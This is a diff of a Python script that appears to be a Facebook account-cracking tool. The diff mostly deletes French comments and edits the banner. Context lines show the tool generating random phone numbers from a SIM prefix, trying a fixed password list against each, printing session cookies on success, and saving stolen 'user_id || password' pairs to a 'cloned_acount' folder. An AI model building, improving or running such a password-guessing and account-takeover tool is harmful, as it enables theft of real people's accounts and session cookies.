@@ -23,20 +23,12 @@ def banner():
                    Facebook:
   https://www.facebook.com/antoine.jean.75033    
                     status:
-         tool free but not open source                  
+         tool free and open source                  
 █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
 """
     print(font)
 
-# def loading(loop,len_user_ids):
-#     tab_slash=['🙈','🙉','🙊','🐵']
-#     width = int((loop + 1) / 4)
-#     bar = "[" + "#" * width + tab_slash[loop%len(tab_slash)]+" " * (int(len_user_ids/4) - width)+"]"
-#     sys.stdout.write(u"\u001b[1000D" +  bar)
-#     sys.stdout.flush()
-#     print()
 
-#pour le random color prend aucun paramatre
 def random_color():
     colors = ['\u001b[38;5;198m', '\u001b[38;5;210m', 
               '\u001b[38;5;190m', '\u001b[38;5;147m', 
@@ -44,7 +36,6 @@ def random_color():
               '\u001b[38;5;129m']
     return random.choice(colors)
 
-#pour colorer prend deux parametre le couleur et le contenue  a colorer
 def color(params, text):
     colors = {
     'red': '\u001b[38;5;198m',
@@ -59,14 +50,12 @@ def color(params, text):
     }
     return colors[params] + text + '\u001b[0m'
 
-#prend le date en moment pour utiliser en tant que nom du fichier (logs cloning)
 def get_current_date():
     current_time=datetime.datetime.now()
     formated_date=current_time.strftime('%A-%B-%d-%Y')
     return formated_date
 
 
-#prend le code dim malagasy 
 def enter_sim_code():
     sim_code=''
     compt=0
@@ -78,7 +67,6 @@ def enter_sim_code():
         compt += 1
     return sim_code
 
-#prend 2 ou 3 parametre pour ecrire le contenue dans le nom du fichier donner
 def write_on_file(file,containes,on_or_not='not on directory'):
     if not os.path.exists(on_or_not) and on_or_not!='not on directory':
         os.makedirs(on_or_not)
@@ -90,7 +78,6 @@ def write_on_file(file,containes,on_or_not='not on directory'):
     with open(FILE_PATH,'a') as file_to_write:
         file_to_write.write(containes)
 
-#prend le nombre du victimes
 def enter_victims_numbers():
     limit=0
     while  limit==-1 or limit<=0:
@@ -105,13 +92,10 @@ def enter_victims_numbers():
             clear()
     return limit
 
-#effacer et ecrire le banner
 def clear():
     os.system('clear')
     banner()
-
-
-#creer les 7 numeros aleatoire apres le code sim 
+ 
 def create_uuid():
     clear()
     global limit
@@ -149,7 +133,6 @@ def create_uuid():
     program()
 
 
-#essaie les mot de passe predefinie pour le numeros creer precedente
 def cracker_method(number_ph,pass_list):
     global user_auth
     global loop
@@ -202,7 +185,7 @@ def cracker_method(number_ph,pass_list):
                     cookies="".join(i['name']+':'+i['value'] for i in response['session_cookies'])
                     print('COOKIES:',cookies)
                     file_name=get_current_date()
-                    write_on_file('[🦏|🦅]'+file_name,f'{user_id} || {password}\n','cloned_acount')
+                    write_on_file('🦏--🦅'+file_name,f'{user_id} || {password}\n','cloned_acount')
                     user_auth.append(user_id)
             else:
                 continue
@@ -210,7 +193,6 @@ def cracker_method(number_ph,pass_list):
     except:   
         pass
 
-#prend le choix utilisateur lors lancement programe
 def using_choice():
     number=['01)','02)','03)']
     letter=['START RANDOM CLONING','HISTORICAL ACOUNT CLONED','EXIT PROGRAM']
@@ -235,7 +217,6 @@ def read_containes_file(file_path,name_file):
             print(containes_file)
             containes_file=file.readline()
 
-#lire quels sont les fichier logs cloning
 def read_file():
     DIRECTORY_PATH=os.getcwd()
     if os.path.exists('cloned_acount'):
